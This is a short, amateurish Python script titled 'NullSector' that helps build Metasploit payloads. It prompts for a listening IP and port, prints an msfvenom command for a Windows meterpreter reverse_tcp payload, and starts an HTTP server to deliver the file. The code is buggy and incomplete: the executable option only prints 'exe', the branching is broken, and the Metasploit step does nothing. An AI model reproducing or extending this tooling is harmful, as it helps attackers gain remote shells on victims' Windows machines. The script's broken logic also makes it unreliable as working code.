#!/usr/bin/python3
import os
import time

#To include in futuer auto gen list
#power = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.ps1"
#

print("Hello World")

print("Welcome to NullSector")
print("This script will assits in generating")
print("msfvenom payloads on your cellphone")

start = input("Would you like to start?[y/n]:")
if start == "y":
    print("Starting...[]:")
    print("The following IP are...")
    time.sleep(1)
    os.system('ifconfig wlan0')
    LHOST = input("What ipaddress of your deivce:")
    LPORT = input("What port would you like to listen on:")
    print("The IP address is set to :" + LHOST + " on port:" + LPORT)
    print("OK now setting up the payload...")
    gen1 = input("What would you like:[p(powershell)/e(.exe)] press Enter to exit ")

    if gen1 == "p":
        print("making powershell")
        print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe -o met.ps1")
    if gen1 == "e":
        print("making executable application")
        print("exe")

    else:
        print("Exiting...")

    print("server is starting up pleae use http://" + LHOST + ":8000" )
    print("Starting up the server becarefull who is on the device!....")
    os.system("python3 -m http.server")

    print("Now that the file is created would you like to start metasploit?...")
    meta = input("[y/n]")
    
    print("Metasploit starting")

else: 
  print("See you soon")
